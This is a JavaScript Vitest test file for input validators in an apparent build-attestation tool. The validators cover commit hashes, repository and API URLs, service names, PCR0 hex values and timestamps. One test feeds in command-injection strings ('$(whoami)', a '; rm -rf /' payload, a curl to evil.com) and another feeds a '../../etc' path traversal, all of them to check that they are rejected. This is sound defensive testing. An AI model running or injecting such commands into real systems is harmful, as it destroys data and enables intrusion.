import { describe, it, expect } from 'vitest';
import {
  validateCommitHash,
  validateRepoUrl,
  validateServiceName,
  validatePcr0Hex,
  validateApiUrl,
  validateSourceDateEpoch,
} from '../lib/validation.js';

describe('validateCommitHash', () => {
  it('accepts valid 40-char SHA-1 hex', () => {
    expect(validateCommitHash('a'.repeat(40))).toBe('a'.repeat(40));
  });

  it('accepts valid 64-char SHA-256 hex', () => {
    expect(validateCommitHash('b'.repeat(64))).toBe('b'.repeat(64));
  });

  it('normalizes to lowercase', () => {
    expect(validateCommitHash('A'.repeat(40))).toBe('a'.repeat(40));
  });

  it('trims whitespace', () => {
    expect(validateCommitHash(`  ${'a'.repeat(40)}  `)).toBe('a'.repeat(40));
  });

  it('rejects short hashes', () => {
    expect(() => validateCommitHash('abc123')).toThrow('full 40-char');
  });

  it('rejects non-hex characters', () => {
    expect(() => validateCommitHash('g'.repeat(40))).toThrow('hex string');
  });

  it('rejects command injection attempts', () => {
    expect(() => validateCommitHash('$(whoami)')).toThrow();
    expect(() => validateCommitHash('"; rm -rf /')).toThrow();
    expect(() => validateCommitHash('main && curl evil.com')).toThrow();
  });
});

describe('validateRepoUrl', () => {
  it('accepts valid HTTPS URL', () => {
    expect(validateRepoUrl('https://github.com/user/repo')).toBe(
      'https://github.com/user/repo',
    );
  });

  it('rejects non-HTTPS', () => {
    expect(() => validateRepoUrl('http://github.com/repo')).toThrow('https://');
  });

  it('rejects git:// protocol', () => {
    expect(() => validateRepoUrl('git://github.com/repo')).toThrow('https://');
  });

  it('rejects localhost', () => {
    expect(() => validateRepoUrl('https://localhost/repo')).toThrow('localhost');
  });

  it('rejects 127.0.0.1', () => {
    expect(() => validateRepoUrl('https://127.0.0.1/repo')).toThrow('localhost');
  });

  it('rejects invalid URL', () => {
    expect(() => validateRepoUrl('not-a-url')).toThrow('valid URL');
  });
});

describe('validateServiceName', () => {
  it('accepts valid services', () => {
    expect(validateServiceName('vies')).toBe('vies');
    expect(validateServiceName('sicae')).toBe('sicae');
    expect(validateServiceName('stripe-payment')).toBe('stripe-payment');
  });

  it('rejects invalid service', () => {
    expect(() => validateServiceName('../../etc')).toThrow('Invalid service');
  });
});

describe('validatePcr0Hex', () => {
  it('accepts valid hex string', () => {
    expect(validatePcr0Hex('ab'.repeat(48))).toBe('ab'.repeat(48));
  });

  it('normalizes to lowercase', () => {
    expect(validatePcr0Hex('AB'.repeat(48))).toBe('ab'.repeat(48));
  });

  it('rejects non-hex', () => {
    expect(() => validatePcr0Hex('not-hex')).toThrow('hex string');
  });

  it('rejects too-short values', () => {
    expect(() => validatePcr0Hex('ab')).toThrow('too short');
  });
});

describe('validateApiUrl', () => {
  it('accepts https', () => {
    expect(validateApiUrl('https://api.tytle.io')).toBe('https://api.tytle.io');
  });

  it('accepts http (for staging)', () => {
    expect(validateApiUrl('http://localhost:3000')).toBe('http://localhost:3000');
  });

  it('rejects ftp', () => {
    expect(() => validateApiUrl('ftp://server.com')).toThrow('http:// or https://');
  });
});

describe('validateSourceDateEpoch', () => {
  it('accepts numeric timestamps', () => {
    expect(validateSourceDateEpoch('1711612200')).toBe('1711612200');
  });

  it('rejects non-numeric', () => {
    expect(() => validateSourceDateEpoch('abc')).toThrow('numeric');
  });

  it('rejects negative', () => {
    expect(() => validateSourceDateEpoch('-1')).toThrow('numeric');
  });
});
